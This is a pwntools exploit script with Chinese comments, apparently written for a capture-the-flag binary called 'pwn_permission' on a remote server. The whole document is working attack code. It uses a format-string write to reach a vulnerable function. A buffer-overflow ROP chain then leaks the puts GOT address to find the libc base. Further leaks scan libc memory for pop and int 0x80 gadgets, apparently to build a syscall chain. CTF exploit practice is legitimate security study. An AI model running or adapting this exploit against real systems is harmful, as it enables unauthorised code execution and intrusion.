
from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# ====== 已知准确的偏移 ======
PUTS_OFFSET = 0x6d1e0

# ====== 连接服务器 ======
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# ====== Step 1: 用格式字符串设置target_val=5，触发vuln ======
target_val_addr = 0x804c030
fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
if b'Input:' not in response:
    log.error("没触发vuln！")
    conn.close()
    exit(1)

log.success("vuln函数已触发！")

# ====== Step 2: 泄露puts地址 ======
write_plt = elf.plt['write']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']

payload = b'A' * 148
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(puts_got)
payload += p32(4)

conn.send(payload)
time.sleep(2)

response = conn.recv(timeout=5)
puts_leak = u32(response[:4])
libc_base = puts_leak - PUTS_OFFSET
log.info(f"libc基址: 0x{libc_base:x}")

# ====== Step 3: 用write泄露libc中可能有gadget的区域 ======
# 我们要找的gadget模式：
# pop eax; ret (0x58c3)
# pop ebx; ret (0x5bc3)
# pop ecx; ret (0x59c3)
# pop edx; ret (0x5ac3)
# int 0x80 (0xcd80)

log.info("正在搜索gadget...")

# 尝试的搜索区域（基于libc6-i386_2.31）
search_regions = [
    (0x00024000, 0x00025000),  # 包含一些常用gadget的区域
    (0x0002e000, 0x0002f000),
    (0x001b1000, 0x001b2000),
    (0x001b8000, 0x001b9000),
]

found = []

for start, end in search_regions:
    size = end - start
    log.info(f"搜索区域: 0x{start:x} - 0x{end:x}")
    
    # 构造ROP链来泄露这段内存
    leak_payload = b'A' * 148
    leak_payload += p32(write_plt)
    leak_payload += p32(vuln_addr)
    leak_payload += p32(1)
    leak_payload += p32(libc_base + start)
    leak_payload += p32(size)
    
    conn.send(leak_payload)
    time.sleep(1)
    
    try:
        data = conn.recv(size, timeout=2)
        log.info(f"接收了 {len(data)} 字节")
        
        # 找我们要的模式
        for i in range(len(data) - 2):
            byte1, byte2 = data[i], data[i + 1]
            
            if (byte1 == 0x58 and byte2 == 0xc3):
                offset = start + i
                log.success(f"找到 pop eax; ret 偏移: 0x{offset:x}")
                found.append(('pop eax; ret', offset))
                
            if (byte1 == 0x5b and byte2 == 0xc3):
                offset = start + i
                log.success(f"找到 pop ebx; ret 偏移: 0x{offset:x}")
                found.append(('pop ebx; ret', offset))
                
            if (byte1 == 0x59 and byte2 == 0xc3):
                offset = start + i
                log.success(f"找到 pop ecx; ret 偏移: 0x{offset:x}")
                found.append(('pop ecx; ret', offset))
                
            if (byte1 == 0x5a and byte2 == 0xc3):
                offset = start + i
                log.success(f"找到 pop edx; ret 偏移: 0x{offset:x}")
                found.append(('pop edx; ret', offset))
                
            if (byte1 == 0xcd and byte2 == 0x80):
                offset = start + i
                log.success(f"找到 int 0x80 偏移: 0x{offset:x}")
                found.append(('int 0x80', offset))
                
    except Exception as e:
        log.info(f"搜索失败: {e}")

log.info(f"找到的gadget: {found}")
conn.close()
